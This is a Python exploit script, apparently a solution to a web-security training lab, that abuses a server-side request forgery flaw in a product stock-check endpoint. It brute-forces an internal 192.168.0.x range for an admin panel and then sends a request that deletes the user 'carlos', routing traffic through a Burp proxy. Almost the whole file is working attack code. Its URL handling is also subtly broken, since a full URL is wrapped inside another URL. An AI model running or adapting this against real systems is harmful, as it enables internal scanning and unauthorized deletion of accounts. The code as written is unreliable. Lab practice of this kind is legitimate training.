#our reconasense info is  
#1 app running on: http://192.168.0.190:8080/admin
#2 carlos_deletion_url: http://192.168.0.190:8080/admin/delete?username=carlos
#3 stock check vurnaillity allow us to scan the internal range
#192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#disabling url warning

proxies ={'http' : 'http://127.0.0.1:8080' ,'https':'http://127.0.0.1:8080'} 
#setting proxies to the burb to be able to debug through the burb in case if code does not work




def get_admin_ip(url): #this function Brute force admin ip 192.168.0.x
    check_stock_path='/product/stock'
    admin_ip=''
    for i in range(1,256):
        current_ip='http://192.168.0.%s:8080/admin'%i
        bruteforced_parameters={'stockApi': current_ip}
        req=requests.post(url +check_stock_path ,data=bruteforced_parameters
        ,verify=False, proxies=proxies)#trying to acces admin interface with current ip  
        
        if (req.status_code== 200):#succeful try 
            admin_ip='http://192.168.0.%s:8080/admin'%i
            break
    if (admin_ip==''):# could not find within this range
        print('(-) could not find admin on this range')
    return admin_ip        
        

def delete_user(url ,admin_ip):
    delete_user_url="http://%s/admin/delete?username=carlos"%admin_ip #SSRF payload
    check_stock_path="/product/stock"
    deletion_param={'stockApi':delete_user_url }
    req=requests.post(url +check_stock_path ,data=deletion_param
    ,verify=False, proxies=proxies )#sending POST request to delete carlos
    
    #user deleted but we want to be sure it is deleted
    Check_admin_url='http://%s:8080/admin'%admin_ip
    checking_params={'stockApi':Check_admin_url}
    req=requests.post(url +check_stock_path ,data=checking_params
    ,verify=False, proxies=proxies )#accessing admin interface
    
    
    if 'User deleted successfully' in req.text:
        print('(+) Succesfully deleted carlos user')
    
    else:
        print('(-) Unsuccessful exploit')   

    



def main():
    #in case the user entrered wrong values 
    if(len(sys.argv) != 2):
        print("(+) Usage: %s <url>" % sys.argv[0])#note that %s is name of script
        #user insructions
        print("(+) Example %s www.example.com" % sys.argv[0] )
        #note that % sys.argv[0] stands for the name of the program
        sys.exit(-1)
    url=sys.argv[1]  
    print("(+) brute forcing the admin ip") 
    admin_ip=get_admin_ip(url) 
    print('(+) found admin ip address : %s' %admin_ip)
    print('(+) Deleting carlos user')
    delete_user(url ,admin_ip) 
    


if __name__ == '__main__':
    main()
    
    
#to run this code
#write in terminal
#python3 2-SSRF_against_back-end_system.py "Url of the lab"       